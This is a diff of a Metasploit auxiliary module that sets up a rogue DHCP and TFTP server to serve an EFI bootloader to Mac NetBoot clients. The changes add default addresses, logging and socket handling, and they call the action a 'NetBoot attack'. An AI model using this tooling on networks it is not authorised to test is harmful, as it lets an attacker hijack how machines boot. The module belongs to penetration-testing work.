@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
 				It does this by providing a specially-configured DHCP server to configure the
 				target's network stack and a TFTP server to serve an EFI bootloader.
 
-				Based on the `pxexploit' module by scriptjunkie. 
+				Based on the pxexploit & dhcp modules. 
 			},
 			'Author'      => [ 'snare' ],
 			'License'     => MSF_LICENSE,
@@ -34,13 +34,13 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('TFTPROOT',	[false, 'The TFTP root directory from which to serve files', '/tftp']),
-				OptString.new('SRVHOST',	[true,	'The IP of the DHCP server']),
+				OptString.new('SRVHOST',	[true,	'The IP of the DHCP server', '192.168.0.10']),
 				OptString.new('SRVNAME',	[false, 'The hostname of the DHCP server']),
 				OptString.new('FILENAME',	[true,	'The filename of the bootloader', 'boot.efi']),
 				OptString.new('ROOTPATH',	[false, 'The path to the root filesystem image']),
 				OptString.new('NETMASK',	[false, 'The netmask of the local subnet', '255.255.255.0']),
-				OptString.new('DHCPIPSTART',[false, 'The first IP to give out']),
-				OptString.new('DHCPIPEND',	[false, 'The last IP to give out']),
+				OptString.new('DHCPIPSTART',[false, 'The first IP to give out', '192.168.0.20']),
+				OptString.new('DHCPIPEND',	[false, 'The last IP to give out', '192.168.0.30']),
 			], self.class)
 	end
 
@@ -53,7 +53,11 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Starting TFTP server...")
 		@tftp = Rex::Proto::TFTP::Server.new
 		@tftp.set_tftproot(datastore['TFTPROOT'])
+		@tftp.set_reporter do |msg|
+			print_status("[TFTP] #{msg}")
+		end
 		@tftp.start
+		add_socket(@tftp.sock)
 
 		print_status("Starting DHCP server...")
 		@dhcp = Rex::Proto::DHCP::Server.new( datastore )
@@ -63,17 +67,19 @@ class Metasploit3 < Msf::Auxiliary
 		# See http://www.afp548.com/article.php?story=20061220102102611 for more info
 		@dhcp.vendor_class_id = "AAPLBSDPC/i386"
 		@dhcp.vendor_encap_opts = "\x08\x04\x81\x00\x00\x67"
-		@dhcp.root_path = datastore['ROOTPATH']
 
-		@dhcp.report do |mac, ip|
-			print_status("Serving NetBoot attack to #{mac.unpack('H2H2H2H2H2H2').join(':')} "+
+		@dhcp.report do |mac, ip, type|
+			print_status("[DHCP] Sending #{type} to #{mac.unpack('H2H2H2H2H2H2').join(':')} "+
 					"(#{Rex::Socket.addr_ntoa(ip)})")
-			report_note(
-				:type => 'NetBoot.client',
-				:data => mac.unpack('H2H2H2H2H2H2').join(':')
-			)
+			if (type == "DHCP Offer")
+				report_note(
+					:type => 'NetBoot.client',
+					:data => mac.unpack('H2H2H2H2H2H2').join(':')
+				)
+			end
 		end
 		@dhcp.start
+		add_socket(@dhcp.sock)
 
 		# Wait for finish..
 		@tftp.thread.join
